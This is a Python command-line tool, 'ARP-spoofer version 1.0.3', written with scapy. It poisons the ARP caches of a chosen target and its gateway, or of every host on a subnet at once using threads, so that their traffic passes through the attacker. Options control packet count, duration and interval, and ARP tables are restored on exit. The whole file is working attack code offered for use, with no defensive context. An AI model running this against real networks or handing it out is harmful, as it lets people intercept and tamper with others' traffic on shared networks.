import argparse
import sys
import time
import socket
import threading

try:
    import scapy.all as scapy
except Exception as e:
    sys.exit("ERROR: Module missing: scapy. Install with > pip install scapy <")


class colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'


def arp_spoof(targetIP1, targetIP2, targetALL, count, timeout, duration, verbose):
    info = ""
    if targetALL == 1:
        info = "ALL"
    else:
        info = "False"

    print("""
—————————————————————————————————
    """)
    print("  Gateway  : ", targetIP2)
    print("  Target   : ", targetIP1)
    print("  Subnet   : ", info)
    print("  Count    : ", count)
    print("  Timeout  : ", timeout)
    print("  Duration : ", duration)
    print("  Verbose  : ", verbose)

    print("""
—————————————————————————————————    
    """)

    def get_mac(ip):
        arpRequest = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arpRequestBroadcast = broadcast / arpRequest
        answeredList = scapy.srp(arpRequestBroadcast, timeout=5, verbose=verbose)[0]
        if len(answeredList) == 0:
            print(f'{colors.RED}ERROR: Unable to get MAC address for IP: {ip}{colors.WHITE}')
            return None
        return answeredList[0][1].hwsrc

    def spoof(targetIP, spoofIP):
        target_mac = get_mac(targetIP)
        if not target_mac:
            print(f'{colors.RED}ERROR: Skipping spoofing for target IP: {targetIP}{colors.WHITE}')
            return
        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=target_mac, psrc=spoofIP)
        scapy.send(packet, verbose=verbose)
        time.sleep(timeout)

    def restore(destination_ip, source_ip):
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip,
                           hwdst=destination_mac,
                           psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, verbose=verbose)

    packetCount = 1
    h_name = socket.gethostname()
    addr = socket.gethostbyname(h_name)

    def send_subnet(targetIP1, targetIP2, packetCount):
        modified_IP = str(targetIP2)[:-1]
        targetIP1 = modified_IP + str(i)
        if targetIP1 == addr:
            pass
        else:
            try:
                spoof(targetIP1, targetIP2)
                spoof(targetIP2, targetIP1)
                print(f'spoofed target gateway ::[{targetIP2}] >> sent spoofed packet [{packetCount}] to {targetIP1}')
            except KeyboardInterrupt:
                sys.exit()
            except Exception as e:
                print(colors.RED, "ERROR: Target unreachable : ", targetIP1, colors.WHITE, end="\r")

    if duration:
        spoof_duration = time.time() + duration
    else:
        spoof_duration = None

    try:
        print("Processing attack...")
        while True:
            packetCount += 1
            if targetALL == 0:
                spoof(targetIP1, targetIP2)
                spoof(targetIP2, targetIP1)
                print(f'spoofed target gateway ::[{targetIP2}] >> sent spoofed packet [{packetCount}] to {targetIP1}')
            else:
                for i in range(2, 254):
                    thread = threading.Thread(target=send_subnet, args=(targetIP1, targetIP2, packetCount))
                    thread.start()

            if count != None and count == packetCount:
                if targetALL == 0:
                    print(f'Sent {packetCount} spoofed packets. \r\n >> cleaning up arp-tables.')
                    restore(targetIP2, targetIP1)
                    print(f' >> restoring OG-MAC from {targetIP2}')
                    restore(targetIP1, targetIP2)
                    print(f' >> restoring OG-MAC from {targetIP1}')
                else:
                    print(f'Sent {packetCount} spoofed packets. \r\n >> cleaning up arp-tables.')
                sys.exit()

            if spoof_duration != None and time.time() >= spoof_duration:
                if targetALL == 0:
                    print(f'Duration of the spoof ended {duration}s. \r\n >> cleaning up arp-tables.')
                    restore(targetIP2, targetIP1)
                    print(f' >> restoring OG-Mac from {targetIP2}')
                    restore(targetIP1, targetIP2)
                    print(f' >> restoring OG-MAC from {targetIP1}')
                else:
                    print(f'Duration of the spoof ended {duration}s. \r\n >> waiting for threads to close')
                sys.exit()

            time.sleep(1)
    except KeyboardInterrupt:
        if targetALL == 0:
            print('Keyboard-Interrupt detected.\r\n >> cleaning up arp-tables.')
            restore(targetIP2, targetIP1)
            print(f' >> restoring OG-MAC from {targetIP2}')
            restore(targetIP1, targetIP2)
            print(f' >> restoring OG-MAC from {targetIP1}')
        else:
            print('Keyboard-Interrupt detected.\r\n >> waiting for threads to close.')
        sys.exit()


def main():
    parser = argparse.ArgumentParser(description="ARP-spoofer version 1.0.3")
    parser.add_argument("gateway", help="specify the gateway ip address")
    parser.add_argument("-t", dest="target", help="specify the target ip address")
    parser.add_argument("-all", action="store_true", help="spoofs all subnet ip addresses")
    parser.add_argument("-c", dest="count", help="stop after sending x amount spoofed packets, None is infinite")
    parser.add_argument("--timeout", dest="timeout", help="timeout between sending spoofed packets")
    parser.add_argument("--duration", dest="duration", help="duration of the spoof, None is infinite")
    parser.add_argument("-v", action="store_true", help="make the spoof more verbose")
    args = parser.parse_args()

    if args.timeout:
        try:
            timeout = int(args.timeout)
            if timeout <= 0:
                print(f'{colors.RED}ERROR: Timeout must be an positive integer{colors.WHITE} \nDefaulted timeout to 1s')
                timeout = 1
        except ValueError:
            print(f'{colors.RED}ERROR: Timeout must be an positive integer{colors.WHITE}')
            sys.exit()
    else:
        timeout = 1

    if args.duration:
        try:
            duration = int(args.duration)
            if duration <= 0:
                print(f'{colors.RED}ERROR: Timeout must be an positive integer{colors.WHITE} \nDefaulted timeout to None (infinite)')
                duration = None
        except ValueError:
            print(f'{colors.RED}ERROR: Duration must be an positive integer{colors.WHITE}')
            sys.exit()
    else:
        duration = None

    if args.count:
        try:
            count = int (args.count)
            if count <= 0:
                print(f'{colors.RED}ERROR: Count must be an positive integer{colors.WHITE} \nDefaulted count to None (infinite)')
                count = None
        except ValueError:
            print(f'{colors.RED}ERROR: Count must be an positive integer{colors.WHITE}')
            sys.exit()
    else:
        count = None

    if args.target:
        arp_spoof(args.target, args.gateway, 0, count, timeout, duration, args.v)

    elif args.all:
        arp_spoof("not specified", args.gateway, 1, count, timeout, duration, args.v)

    else:
        sys.exit("ERROR: Missing arguments.")


if __name__ in "__main__":
    main()